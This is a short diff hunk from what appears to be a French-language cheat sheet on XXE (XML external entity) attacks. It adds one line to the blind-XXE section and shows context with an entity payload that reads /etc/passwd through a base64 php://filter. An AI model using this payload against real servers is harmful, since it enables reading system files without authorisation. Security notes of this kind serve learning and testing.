@@ -88,6 +88,7 @@ Référencer les entités
 ]>
 ```
 ### À l'aveugle
+S'il n'est pas possible de voir le résultat
 1. Servir le fichier `xxe.dtd` et `index.php`
 ```xml
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
